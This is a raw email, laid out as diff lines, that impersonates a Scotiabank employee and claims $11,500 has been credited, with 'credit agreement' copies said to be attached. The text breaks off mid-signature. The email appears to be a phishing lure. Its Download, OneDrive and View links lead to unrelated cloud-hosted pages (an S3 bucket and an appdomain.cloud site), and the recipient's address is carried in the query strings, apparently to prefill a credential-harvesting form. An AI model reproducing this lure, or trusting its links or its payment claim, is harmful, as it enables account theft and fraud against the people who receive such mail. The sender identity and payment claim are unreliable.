@@ -1,0 +1,1152 @@
+Return-Path: bounces+4793822-e3a8-jose=monkey.org@sendgrid.net
+Delivered-To: jose@monkey.org
+X-FDA: 76551321378.28.deer38_2102e6e1a4108
+X-Spam-Summary: 1,0,0,,d41d8cd98f00b204,bounces+4793822-e3a8-jose=monkey.org@sendgrid.net,,RULES_HIT:30001:30007:30022:30029:30038:30054:30055:30059:30064:30070:30074:30075:30090,0,RBL:192.254.126.64:@sendgrid.net:.lbl8.mailshell.net-64.10.201.10 62.18.0.100,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:appdomain.cloud-sh.dbl.urbl.hostedemail.com-127.0.0.175,Custom_rules:0:3:0,LFtime:9,LUA_SUMMARY:none
+X-HE-Tag: deer38_2102e6e1a4108
+X-Filterd-Recvd-Size: 81457
+Received: from chfztzqh.outbound-mail.sendgrid.net (chfztzqh.outbound-mail.sendgrid.net [192.254.126.64])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon,  2 Mar 2020 18:53:46 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.net; 
+	h=from:to:subject:mime-version:content-type:content-transfer-encoding; 
+	s=smtpapi; bh=Xg3kTcPI+4gZnikbl4B1AM8dikUI3jKi+4ZJrl4HeCc=; b=Yt
+	QSdj5ibksxILl+eM9qiUoC1hqlMq236vvaGOPRw+2dKjT4eFSNmOvK8xCpy6QeDD
+	2eNNlPNAEXv0FStTyJ1EPLUkGu5xpQBx5YPI06hTlKXFuw2SWjzwHfzx25bOH01T
+	1Ik4+hwEP0kYDMC8i5lBE7T7l0dMYc5VOvNzn7bic=
+Received: by filter0385p1iad2.sendgrid.net with SMTP id filter0385p1iad2-2787-5E5D5639-1
+        2020-03-02 18:53:45.003776402 +0000 UTC m=+715757.895886169
+Received: from scotiabank.com (unknown [162.248.247.94])
+	by ismtpd0035p1iad2.sendgrid.net (SG) with ESMTP id Tc9P6bDpS_es57U11gRzng
+	for <jose@monkey.org>; Mon, 02 Mar 2020 18:53:44.973 +0000 (UTC)
+From: Michael Harfmann <michaell.harfmann@scotiabank.com>
+To: jose@monkey.org
+Subject: Inward Remittance payment  
+Date: Mon, 02 Mar 2020 18:53:45 +0000 (UTC)
+Message-ID: <20200302105344.962F64BB9999E9A3@scotiabank.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-SG-EID: uk4PP0eEjut4P8/eKt92EMT2PN5rig6Ts8EnoW54QtAwDYMfdp+HHtlVEsr1ts/IModaXKqE8WrF2V
+ 7DBflKdC/zhsyq2JgJuk5evv5G8OaHEAmSVJZdB3+WSNop/14kkGfXQokRy8IkX3NbMNAkvu/U5rsd
+ Ii+B0e6CiwGYDOkHD4bbIMGvWWIi7c0t2RrxwFXw5Kkp8Tdt2hyzfzXCcJAP15E6XUqv9MsYhN6jc0
+ w=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 37
+
+<HTML><HEAD>
+<META content=3D"text/html; charset=3DUTF-8" http-equiv=3DContent-Type>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<DIV style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "S=
+egoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont=
+, Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: =
+baseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-=
+TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; =
+FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; =
+ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-style: initial; text-decoration-color: initial'>
+<DIV style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
+ BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; -webkit-fon=
+t-smoothing: antialiased">
+<A style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; B=
+ORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing=
+: antialiased" href=3D"https://duesouthxlcu90.s3-ap-southeast-2.amazonaws.c=
+om/vsp/quickasp1.html?outhxlcu9=3Da3Jpdi5rYXJAaG90bWFpbC5jb20=3D&amp;uahux0=
+" rel=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<img style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
+ BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; -webkit-fon=
+t-smoothing: antialiased" border=3D"0" hspace=3D"0" alt=3D"" src=3D"data:im=
+age/png;base64,iVBORw0KGgoAAAANSUhEUgAAANIAAAAuCAYAAABdyUcgAAAR/UlEQVR4Xu2d=
+B3CV1daG35wkQAglIkoXEAihI01AVCQK6oj6K9UuClxRKSIW7IpURewdxYJl8LdiV0ClCCIKhE5=
+IAklIIb2QfudZ+OUekJLkMJoM35phkuzzlb3XXu/q++BXUlJSIpdcDrgc8IkDfi6QfOKfe7PLAe=
+OAAamwsFDbt28Xxik/P99ljcsBlwNH4YDH41FgYKAaNWqkkJCQ/wFp165datCggWrWrOky0OWAy=
+4EycmDTpk1q3779/4C0efNmtW3bViDNJZcDLgfKxoE///xTXbp0ORhIoaGh8vf3L9sT3KtcDrgc=
+0B9//KGuXbu6QHJlweWALxxwgeQL99x7XQ78xQEXSK4ouBw4DhxwgXQcmOg+wuWACyRXBlwOHAc=
+O+ASkjIwM5WRnl3kaAYGBqhtSV4EBgWW+51gXp
+qWlaefOnerevftBl27dutUyj61bty4dp9i8bNkyKzSfddZZqlOnjn22bt06xcTEqHbt2howYICN=
+RUREaMeOHQoICJCfn5/969OnT2nRjWt+/fVXtWzZUqeeeqrdk5iYqNWrVys4OFjnnHPOQZlP3hE=
+dHa2GDRuqd+/eSk9PF6WGXr16/a3UwHspiLdp00aZmZn67bfflJ2draKiIp155pn2DObnPK9bt2=
+72/q+++kqsMSgoSP369VONGjVsfOPGjWrXrp3Nh2ft3btXxcXFNm/mwu+///576Xjjxo3Vo0cPu=
+3flypVKSkpS3bp1de6555byEr4vXbpU1atX10UXXXTQ+PLly40HzAH+QampqXY99clBgwbZWEFB=
+gVasWCGe1aJFi9L0cU5OjnhGXl6e8YFsWLNmzY4lCv/q5z4BaeWK5SosKFLNWsG24CORn6Ti4hI=
+lJiRYsbdHr57HZdFPP/20CeSePXv0yiuv2DP37dunxx57zCrNV
+JzvuOOO0nc988wzJhBsEML04IMPmpB88cUXqlevntauXauOHTtq2LBhoi6wZcsWewaC9v777+up=
+p54q3VAE+aabbtJdd92lK664wkA0b948E4aUlBQT/DvvvNPevWjRIgP76aefbiA4++yzDYQTJ06=
+05zZv3vwgflx++eUm+DNmzNCqVav08ssv68orr7R5f//997rvvvuUkJCgJ5980uYQHh6uxx9/3O=
+aGMkApDBw40J7B3EeNGiV4xdqd61kXewHgEfKHH35Yffv2NYXRtGlT+x3evvHGG2rVqpXNF96MG=
+DFCycnJmjt3rikv7o2LizNeAuJp06bZddu2bVP9+vU1ZswYoXCfffZZmw984/k33nijKZKff/5Z=
+p5xyipYsWaKrrrrKgI1QsmYAypp79uxpQKvM5BOQfl2xSqHt2uqkk04q0xpXLF+h4OCaKiwqUoc=
+OHUo1ZpluPsJFCMoDDzxgguRNkZGR+uabb3TLLbeUauWFCxdq+
+vTp9jegQJN7a1meNXr0aNtER5NyLVVrNvrWW2+1e3Nzc03I0dwIAUIOGBEoBAelgqC8+eabdi/z=
+mDRp0kHzQ9O/9tprOu200/TQQw+VfoYlnT17tlnGq6++2gSYawEd9OWXX2r//v0G3ueee87exz1=
+YI0B9KDEX5j1r1iwDGQL/6KOPHnQZwH/77bc1YcKEI24FCgdFhJL66KOPDBysEeLnSy+9pE8//d=
+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
+tRAAAAAElFTkSuQmCC" width=3D"210" align=3D"baseline" height=3D"46" data-ima=
+getype=3D"AttachmentByCid" originalsrc=3D"cid:capture212.png" data-custom=
+=3D"AQMkADAwATY0MDABLWViN2UtMGQ1Zi0wMAItMDAKAEYAAAM1Ibv6TQKwRaOJ%2Bo6MA7HVB=
+wB2gdVIKnU6TYnarAOaYxh6AAACAQwAAAB2gdVIKnU6TYnarAOaYxh6AALXMX9XAAAAARIAEAC0=
+W5RhAQdbR6jbkNIgv96v" naturalheight=3D"46" naturalwidth=3D"210" crossorigin=
+=3D"use-credentials"></A><BR class=3Dx_gmail-Apple-interchange-newline styl=
+e=3D"-webkit-font-smoothing: antialiased"><BR style=3D"-webkit-font-smoothi=
+ng: antialiased">
+<A style=3D'FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Kalinga, "Nirmal=
+a UI", "Oriya MN", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
+ BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
+px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inheri=
+t; -webkit-font-smoothing: antialiased' href=3D"https://globalunlimkted7002=
+.eu-gb.cf.appdomain.cloud/?NewUiLog=3Djose@monkey.org&08e9" rel=3D"external=
+ noopener &#13;&#10;noreferrer" target=3D_blank=20
+data-auth=3D"NotApplicable">Download</A><SPAN>&nbsp;</SPAN><SPAN style=3D'F=
+ONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Kalinga, "Nirmala UI", "Oriya=
+ MN", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: rgb(86,87,87); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretc=
+h: inherit; -webkit-font-smoothing: antialiased'>
+ <SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baselin=
+e; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADD=
+ING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; -webkit-f=
+ont-smoothing: antialiased">&nbsp;</SPAN>&nbsp; &nbsp;</SPAN><SPAN>&nbsp;</=
+SPAN>
+ <A style=3D'FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Kalinga, "Nirma=
+la UI", "Oriya MN", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline=
+; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: =
+0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inher=
+it; -webkit-font-smoothing: antialiased' href=3D"https://globalunlimkted700=
+2.eu-gb.cf.appdomain.cloud/?NewUiLog=3Djose@monkey.org&08e9" rel=3D"externa=
+l noopener &#13;&#10;noreferrer" target=3D_blank=20
+data-auth=3D"NotApplicable">Save to OneDrive</A><SPAN>&nbsp;</SPAN><SPAN st=
+yle=3D'FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Kalinga, "Nirmala UI"=
+, "Oriya MN", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORD=
+ER-BOTTOM: 0px; COLOR: rgb(86,87,87); PADDING-BOTTOM: 0px; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; fon=
+t-stretch: inherit; -webkit-font-smoothing: antialiased'>&nbsp;</SPAN><SPAN=
+>&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Kalinga, "Ni=
+rmala UI", "Oriya MN", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; BORDER-BOTTOM: 0px; COLOR: rgb(86,87,87); PADDING-BOTTOM: 0px; PADDING=
+-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT:=
+ 0px; font-stretch: inherit; -webkit-font-smoothing: antialiased'>-</SPAN><=
+SPAN>&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Kalinga, "Ni=
+rmala UI", "Oriya MN", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; BORDER-BOTTOM: 0px; COLOR: rgb(86,87,87); PADDING-BOTTOM: 0px; PADDING=
+-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT:=
+ 0px; font-stretch: inherit; -webkit-font-smoothing: antialiased'>&nbsp;</S=
+PAN><SPAN>&nbsp;</SPAN>
+ <A style=3D'FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Kalinga, "Nirma=
+la UI", "Oriya MN", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline=
+; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: =
+0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inher=
+it; -webkit-font-smoothing: antialiased' href=3D"https://globalunlimkted700=
+2.eu-gb.cf.appdomain.cloud/?NewUiLog=3Djose@monkey.org&08e9" rel=3D"externa=
+l noopener &#13;&#10;noreferrer" target=3D_blank=20
+data-auth=3D"NotApplicable">View</A><BR style=3D"-webkit-font-smoothing: an=
+tialiased"></DIV>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><BR style=3D"=
+-webkit-font-smoothing: antialiased"></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inhe=
+rit; -webkit-font-smoothing: antialiased'>Hi</SPAN></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inhe=
+rit; -webkit-font-smoothing: antialiased'></SPAN>&nbsp;</P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inhe=
+rit; -webkit-font-smoothing: antialiased'>
+The $11500 has been credited to your account.&nbsp; I have also included co=
+pies of the credit agreement as discussed for your records on behalf of our=
+ client</SPAN></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inhe=
+rit; -webkit-font-smoothing: antialiased'></SPAN>&nbsp;</P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inhe=
+rit; -webkit-font-smoothing: antialiased'>Have an excellent day</SPAN></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inhe=
+rit; -webkit-font-smoothing: antialiased'></SPAN>&nbsp;</P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inhe=
+rit; -webkit-font-smoothing: antialiased'></SPAN>&nbsp;</P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><B style=3D"-=
+webkit-font-smoothing: antialiased"><SPAN style=3D'FONT-SIZE: 12pt; BORDER-=
+TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Light", sans-serif; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDI=
+NG-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARG=
+IN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -webkit-font-smoothing:=
+ antialiased'>Michael Harfmann&nbsp;</SPAN></B><SPAN>
+ &nbsp;</SPAN><SPAN style=3D"BORDER-TOP: 0px; FONT-FAMILY: Tahoma, sans-ser=
+if; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR:=
+ ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0=
+px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -webkit-font-sm=
+oothing: antialiased"></SPAN>
+ <SPAN style=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Lig=
+ht", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: base=
+line; BORDER-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; PADDIN=
